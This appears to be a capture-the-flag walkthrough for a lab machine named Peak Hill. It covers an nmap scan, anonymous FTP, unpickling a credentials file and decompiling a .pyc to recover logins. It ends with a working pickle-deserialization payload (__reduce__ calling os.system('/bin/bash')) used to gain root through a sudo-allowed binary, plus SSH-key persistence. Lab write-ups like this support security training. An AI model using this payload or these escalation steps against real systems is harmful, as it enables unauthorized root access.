# Peak Hill

## NMAP result
```
Nmap 7.91 scan initiated Sun Jul  4 01:23:14 2021 as: nmap -sS -n -Pn -A -p- -T4 -o nmap.txt 10.10.239.212
Nmap scan report for 10.10.92.113
Host is up (0.17s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open   swx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, RPCCheck, RTSPRequest: 
|     Username: Password:
|   NULL: 
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7321-TCP:V=7.91%I=7%D=7/4%Time=60E0C667%P=x86_64-pc-linux-gnu%r(NUL
SF:L,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%r(
SF:GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Username:
SF:\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(RP
SF:CCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"User
SF:name:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passwor
SF:d:\x20")%r(Help,14,"Username:\x20Password:\x20");
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  4 01:52:49 2021 -- 1 IP address (1 host up) scanned in 1775.61 seconds
```
## FTP
- FTP allowed anonymous login.
- After login found a file `creds` with `ls -la` command.
- Downloaded the creds file to local system `get creds`.
- When checking found the file deserialized with pickle.
- unpicked the file with below python code:
```
import pickle

data = open("creds_decoded.pkl", "rb")
res = pickle.load(data)

print(res)

```
- or we can use below code to get all data orderly:
```
#!/usr/bin/env python3

import pickle
import re

with open('creds.dat', 'rb') as f:
    data = pickle.load(f)
    sshuser = []
    sshpass = []

    for i in data:
        pos = int(re.findall('\d+', i[0])[0])
        if 'ssh_user' in i[0]:
            sshuser.append([pos, i[1]])
        else:
            sshpass.append([pos, i[1]])

    sshuser.sort()
    sshpass.sort()
    print("SSH user: {}".format(''.join([i[1] for i in sshuser])))
    print("SSH pass: {}".format(''.join([i[1] for i in sshpass])))

```
- Now we have ssh username and password:

## SSH - gherkin

- after ssh into gherkin we got a file cmd_service.pyc
- we copied the file to the local system, `scp gherkin@<ipaddress>:/home/gherkin/cmd_service.pyc .`
- We can decompile the file from https://www.decompiler.com/
- after decompiling we got encoded username and password in long format.
- we can use below code for to convert long to byte.
```
from Crypto.Util.number import long_to_bytes
print(long_to_bytes(1684630636))
print(long_to_bytes(2457564920124666544827225107428488864802762356))
```
- now we have username and password for port 7321.

## Login using port 7321 with user dill
- start nc.
- `nc ip_address 7321` and give username and password.
- Here we can run commands but we can't get out of the directory.
- Copy there ssh file and login through ssh.

## SSH user dill
- After login, if we run `sudo -l` we get the following output.
```
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```
- try running `peak_hill_farm`
- cd `/opt/peak_hill_farm`
- `sudo ./peak_hill_farm`
- try entering anything to check how it runs. Seams the input needed to be in base64 encoded.
- Try giving input in base64, obvously we it won't work.
- Now we can try to pickle to execute command by deserilaizing commands and encoding in base64. The code is below:
```
import pickle
import base64

class execute(object):
    def __reduce__(self):
        import os
        return (os.system,("/bin/bash",))
   
print(base64.b64encode(pickle.dumps(execute())))
```
- Paste base64 command and now we are root.
- We can copy our public ssh key for persistance to root.